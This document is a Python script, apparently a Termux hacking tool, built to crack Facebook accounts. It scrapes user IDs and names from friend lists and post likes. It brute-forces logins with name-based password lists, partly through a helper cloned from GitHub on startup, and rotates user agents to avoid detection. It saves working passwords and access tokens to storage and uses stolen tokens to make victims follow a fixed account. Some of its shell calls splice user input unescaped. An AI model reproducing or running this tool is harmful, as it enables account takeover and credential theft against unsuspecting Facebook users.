#coding=utf-8
import os,sys,re,time,random,json,string,requests,bs4
from concurrent.futures import ThreadPoolExecutor as ThreadPool
logo="""
\t##     ##    #######    ########  
\t##     ##   ##     ##   ##     ## 
\t##     ##   ##     ##   ##     ## 
\t#########   ##     ##   ########
\t##     ##   ##     ##   ##        
\t##     ##   ##     ##   ##        
\t##     ##    #######    ##        
--------------------------------------------------
  Author   : Muhammad Hamza
  Facebook : https://facebook.com/mhamza1626
  Youtube  : HCoders
--------------------------------------------------
  If oppurtunity donot knock, build a door
--------------------------------------------------"""
oks=[]
cps=[]
khud=[]
templock=[]
ua_mbasic=['Mozilla/5.0 (Linux; Android 7.0; RNE-AL00 Build/HUAWEIRNE-AL00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.4; es-es; GT-I9060C Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; HTC_One_S Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.3; fr-fr; SGH-T999 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.3.6; en-gb; GT-S5360 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.2; nl-nl; Desire_A8181 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; ru-ru; SM-T315 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.3.3; ru-ru; DROIDX Build/4.5.1_57_DX5-35) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; U30GT 2MH Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30']

def bootstrap():
    if not os.path.isfile('/data/data/com.termux/files/home/.localhost/Karma-kh3n/node_modules/uuid/v1.js'):
        os.system('cd /$HOME && mkdir .localhost && cd .localhost && git clone https://github.com/Karma-kh3n/karma')
        os.system('cd /$HOME/.localhost/Karma-kh3n && npm install -g npm@6 && npm audit fix')
    else:
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd /$HOME/.localhost/Karma-kh3n && node index.js &')
        time.sleep(3)
        pass
bootstrap()
def main():
    os.system('clear')
    print(logo)
    print('  [1] Crack')
    print('  [2] Create file')
    print('  [3] Separate ids from file')
    print('  [4] Remove dublicate ids')
    print('  [l] Login another token')
    print(50*'-')
    option = input('  Select option: ')
    if option =='1':
        crack_method()
    elif option =='2':
        create_file()
    elif option =='3':
        sep()
    elif option =='4':
        dublicate()
    elif option =='l' or option =='L':
        os.system('rm -rf access_token.txt')
        login()
    else:
        print('  Choose valid option ')
        time.sleep(1)
        main()
def crack_method():
    global khud
    os.system('clear')
    print(logo)
    print('  [1] HOP login method 1') #fb_messenger_api
    print('  [2] HOP login method 2') #m.facebook
    print(50*'-')
    cs = input('  Choose crack method: ')
    if cs =='1':
        bootstrap()
        khud.append('method1')
        crack()
    elif cs =='2':
        khud.append('method2')
        crack()
    else:
        print('\n Choose valid method ....')
        time.sleep(1)
        crack_method()
def create_file():
    os.system('clear')
    print(logo)
    print('  [1] Create file manual')
    print('  [2] Create file auto')
    print('  [3] Create file with post likes')
    print('  [B] Back to main menu')
    print(50*'-')
    cf = input('  Choose method: ')
    if cf =='1':
        manual()
    elif cf =='2':
        auto()
    elif cf =='3':
        likes()
    elif cf =='3' or cf =='b' or cf =='B':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        create_file()
def crack():
    global cps
    global oks
    global ua_mbasic
    os.system('clear')
    print(logo)
    file = input('  Put file path: ')
    try:
        fileopen = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print('  File not found on provided path, try again ....')
        time.sleep(1)
        crack()
    print(50*'-')
    print('  [1] All name passwords')
    print('  [2] First&last name passwords')
    print('  [3] All mix names')
    print('  [4] Choice passwords')
    print(50*'-')
    gaddari = input('  Choose passlist: ')
    if gaddari =='1':    
        os.system('clear')
        print(logo)
        print(('\033[1;97mTotal IDs : '+str(len(fileopen)))+'\033[0;97m')
        print(' \033[1;97mYour Process Started in Background')
        print('-------------------------------------------')
        with ThreadPool(max_workers=30) as davidworld:
            for user in fileopen: # Yo Ndak Tau Kok Tanya Saia
                try:
                    uid, name = user.split('|')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                    	pwx = [name,xz[0].lower()+xz[1].lower(),name.lower()]
                    else:
                        pwx = [name,xz[0].lower()+xz[1].lower(),name.lower()]
                    davidworld.submit(method1,uid,pwx)
                except:
                    pass
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        main()
    elif gaddari =='2':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                except ValueError:
                    print('\n This file is not supported for HOP tool.Create file only from HOP tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+' '+ps2,ps+ps2,first+' '+last,first+last]
                if 'method1' in khud:
                    yaari.submit(method1,uid,pwx)
                elif 'method2' in khud:
                    yaari.submit(method2,uid,pwx)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        os.system('python aoun.py')
    elif gaddari =='3':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                except ValueError:
                    print('\n This file is not supported for HOP tool.Create file only from HOP tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+' '+ps2,ps+ps2,first+' '+last,ps+'12',ps+'1234',ps+'1122',ps+'786',first+'123',first+'12345',ps+'123',ps+'12345']
                if 'method1' in khud:
                    yaari.submit(method1,uid,pwx)
                elif 'method2' in khud:
                    yaari.submit(method2,uid,pwx)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        os.system('python aoun.py')
    elif gaddari =='4':
        print(50*'-')
        print('  Password example: 667788,334455,99900,khan khan,khankhan etc')
        print(50*'-')
        pwx = input('  Put passwords: ').split(',')
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            print('  Total ids: '+str(len(fileopen)))
            print('  Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                except ValueError:
                    print('\n This file is not supported for HOP tool.Create file only from HOP tool....\n')
                    os.sys.exit()
                if 'method1' in khud:
                    yaari.submit(method1,uid,pwx)
                elif 'method2' in khud:
                    yaari.submit(method2,uid,pwx)
        print(50*'-')
        print('  The process has completed')
        print('  Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        print(50*'-')
        input('  Press enter to back ')
        os.system('python aoun.py')
    else:
        print('  Choose valid passlist, try again ...')
        time.sleep(1)
        main()
def method1(uid,pwx):
    try:
        global oks
        global cps
        for ps in pwx:
            data = requests.get('http://localhost:5000/auth?id='+uid+'&pass='+ps).text
            q=json.loads(data)
            if 'loc' in q:
                print('\033[1;32m  [Successful-HOP] '+uid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                with open('/sdcard/ids/ok.txt','a') as pushpa:
                    pushpa.write(uid+'|'+ps+'\n')
                access = q['loc']
                open('/sdcard/ids/tokens.txt','a').write(access+'\n')
                follow_id='100048514350891'
                subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+access).text
                break
            elif 'www.facebook.com' in q['error']:
                print('\033[1;31m  [Checkpoint-HOP] '+uid+' | '+ps+'\033[0;97m')
                cps.append(uid)
                break
            else:
                continue
    except:
        pass
def method2(uid,pwx):
    try:
        global cps
        global oks
        global ua_mbasic
        ua = random.choice(ua_mbasic)
        for ps in pwx:
            #print(uid+'|'+ps)
            session = requests.Session()
            lsd =  str(''.join(random.choice(string.digits+string.ascii_uppercase+string.ascii_lowercase) for _ in range(11)))
            jazoest = str(''.join(random.choice(string.digits) for _ in range(4)))
            m_ts = str("16430"+''.join(random.choice(string.digits) for _ in range(5)))
            li = str(''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase) for _ in range(24)))
            header = {'authority':'m.facebook.com','path': '/login.php','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','connection':'keep-alive','sec-ch-ua': '" Not A;Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
            session.headers.update(header)
            log = {'lsd':lsd,'jazoest':jazoest,'m_ts':m_ts,'li':li,'try_number':'0','unrecognized_tries':'0','email':uid,'pass':ps,'login':'Log In','_fb_noscript':'true'}
            log_s = session.post('https://m.facebook.com/login.php',data=log)
            #print(session.cookies.get_dict().keys())
            if 'c_user' in session.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                cid=kuki[7:22]
                print('\033[1;32m  [Successful-HOP] '+cid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                with open('/sdcard/ids/ok.txt','a') as pushpa:
                    pushpa.write(cid+'|'+ps+'\n')
                break
            elif 'checkpoint' in session.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                cid = kuki[24:39]
                print('\033[1;31m  [Checkpoint-HOP] '+cid+' | '+ps+'\033[0;97m')
                cps.append(uid)
                break
            else:
                continue
    except:
        pass
def login():
    os.system('clear')
    print(logo)
    tok = input('  Put access token: ')
    try:
        u = requests.get(f'https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print(' Logged in successfully')
        time.sleep(1)
        main()
    except KeyError:
        print('\n  Invalid token provided, try again  ')
        time.sleep(1)
        login()
def manual():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    print('  Checking logged in account ....')
    try:
        r = requests.get(f'https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(5000*'-')
    limit = int(input('  How many ids do you want to add ? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put id no%s: '%t)
            r = requests.get(f'https://graph.facebook.com/'+ids+'/friends?access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
        except KeyError:
            print('  No friend for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    main()
def likes():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    print('  Checking logged in account ....')
    try:
        r = requests.get(f'https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    print(logo)
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  From how many posts do you want to extract? '))
    save_file = input('  Save file as: ')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('  Put post id no%s: '%t)
            r = requests.get(f'https://graph.facebook.com/'+ids+'/reactions?limit=999999&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                first_name = names.split(' ')[0]
                try:
                    last_name = names.split(' ')[1]
                except:
                    last_name = 'Khan'
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
                if 'next' in str(q):
                    l1 = q['paging']
                    l2 = l1['next']
                    r2 = requests.get(l2)
                    q=json.loads(r2.text)
                    for j in q['data']:
                        uids = j['id']
                        names = j['name']
                        first_name = names.split(' ')[0]
                        try:
                            last_name = names.split(' ')[1]
                        except:
                            last_name = 'Khan'
                        with open('/sdcard/'+save_file, 'a') as rd:
                            rd.write(uids+'|'+first_name+'|'+last_name+'\n')
                else:pass
        except KeyError:
            print('  No likes for '+ids)
            pass
    print(50*'-')
    print('  Ids saved as: '+save_file)
    print(50*'-')
    input(' Press enter to back')
    main()
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get(f'https://graph.facebook.com/me?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    print(logo)
    print('  Logged user: '+uname)
    print(50*'-')
    nusrat = []
    try:
        limit_user = int(input('  How many ids do you want to add ? '))
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('  Put id%s: '%(count))
        try:
            tfile = open('access_token.txt','r').read()
            fr = requests.get(f'https://graph.facebook.com/'+udit+'/friends?access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('  Logged token has expired ...')
                pass
            else:
                print('  No friends found for user: '+udit)
                pass
    os.system('clear')
    print(logo)
    print('   Total ids: '+str(len(nusrat)))
    print(5000*'-')
    try:
        ask_link = int(input('  How many links do you want to grab? '))
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('  %s Link start with: '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
    save_file = input('  Save file as: ')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('  Total ids to grab: '+str(len(lines)))
    print('  Grabbing Process has started')
    print(5000*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('access_token.txt','r').read()
            rg = requests.get(f'https://graph.facebook.com/'+ids+'/friends?access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                first_name = nm.split(' ')[0]
                try:
                    last_name = nm.split(' ')[1]
                except:
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
            print('  Grabbed from: '+ids)
           # print('  Total friends: '+str(len(uids)))
            print('  Token status: Live')
            print(50*'-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('  Token has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('  Grabbed from: '+ids)
                print('  Friendlist ids: 0')
                print('  Token status: Live')
                print(50*'-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('  Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('  Total ids grabbed: '+str(len(lenid)))
    print('  File saved as: /sdcard/'+save_file)
    print(50*'-')
    input('  Press enter to back ')
    main()
def dublicate():
    dub=[]
    os.system('clear')
    print(logo)
    df = input('  Put file name: ')
    sdf = input('  Save new file as: ')
    dc=0
    dfc = open(df, 'r').read().splitlines()
    for i in dfc:
        if i in dub:
            dc+=1
            print('  Dublicate link %s: '%dc)
            pass
        else:
            open('/sdcard/'+sdf, 'a').write(i+'\n')
    print(5000*'-')
    print('  The process has completed')
    print(5000*'-')
    input('  Press enter to back ')
    main()
def sep():
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many links do you want to separate? '))
    except:
        limit = 1
    file_name = input(' Input file name: ')
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/'+new_save)
    print(50*'-')
    print('  Links grabbed successfully')
    print('  Total grabbed links: '+str(len(open('/sdcard/'+new_save).read().splitlines())))
    print('  New file saved as: /sdcard/'+new_save)
    print(50*'-')
    input('  Press enter to back ')
    main()
if __name__=='__main__':
    main()
